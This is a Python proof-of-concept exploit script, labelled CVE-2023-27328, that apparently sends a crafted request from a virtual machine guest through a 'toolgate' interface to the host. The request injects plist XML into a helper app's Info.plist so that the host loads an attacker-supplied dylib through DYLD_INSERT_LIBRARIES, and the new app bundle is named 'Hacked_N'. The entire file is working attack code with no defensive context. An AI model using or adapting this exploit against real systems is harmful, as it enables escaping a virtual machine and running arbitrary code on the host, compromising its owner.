#!/usr/bin/env python3

# CVE-2023-27328

import argparse
import random
from pwn import *
from PIL import Image
from toolgate import *

tg = ToolgateClient()

def main(args):
    plist_data = ''
    if args.dylib:
        dylib_path = args.dylib
        log.info(f'Host will load {dylib_path}')
        # This is the XML which will be inserted into the helper app Info.plist
        plist_data = f"""evil</string>
                    </array>
                </dict>
            </array>
            <key>LSEnvironment</key>
            <dict>
                <key>DYLD_INSERT_LIBRARIES</key>
                <string>{dylib_path}</string>
            </dict>
            <key>blabla</key>
            <array>
                <dict>
                    <key></key>
                        <array>
                            <string>""".encode()

    elif args.data:
        plist_data = args.data.encode()
        
    sgah_cmd = flat({
        0: 20 + len(plist_data),
        4: 0xACDCBABA,
        8: 1,
        12: len(plist_data),
        16: 0x2028,
        20: 0,
        24: plist_data,
    }, word_size=32)
    
    log.info('Reading icon')
    img = Image.open('./smile.png')
    img_bytes = img.tobytes('raw', 'BGRA')
    
    # Create a unique name so we're sure it will create a new app and not use
    # an existing one. 
    rand_num = random.randint(1,10000)
    bundle_name = f'Hacked_{rand_num}'
    log.info(f'Creating {bundle_name}.app')

    sgah_offset = 2000 + len(img_bytes)
    buf1_data = flat({
        0: 0x68,            # opcode
        4: 1,
        8: 0,
        12: 0,
        16: len(sgah_cmd),
        32: sgah_offset,    # sgah_cmd offset
        36: 0,              # image icon flag, must be 0
        40: f'{bundle_name}\0'.encode('utf-16le'),
        562: f'/path/to/guest/binary_{rand_num}\0'.encode('utf-16le'),
        1092: 'app shortcut item\0'.encode('utf-16le'),
        1614: img.width,    # image width
        1618: img.height,   # image height
        1622: img_bytes,    # image data
        sgah_offset: sgah_cmd,
        sgah_offset+1000: 0
    }, word_size=32)
    
    buf1 = tg.get_tg_buffer_from_data(buf1_data)
    buf2 = tg.get_tg_buffer_from_data(b'\0'*len(buf1_data), writeable=True)
    req = create_tg_request_type(0, 2)(TG_REQUEST_FAVRUNAPPS, TG_STATUS_PENDING, 0, 2, 0, b'', (TG_BUFFER * 2)(buf1, buf2))
    tg.submit(req)
    log.info('Done :)')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--data', 
        help='The data to insert into the plist file',
        required=False)
    parser.add_argument(
        '--dylib',
        help='Specify a path to a dylib which will be loaded with DYLD_INSERT_LIBRARIES',
        required=False)
    args = parser.parse_args()
    if not args.data and not args.dylib:
        print(f'Error: --data or --dylib required')
        exit(1)
    main(args)
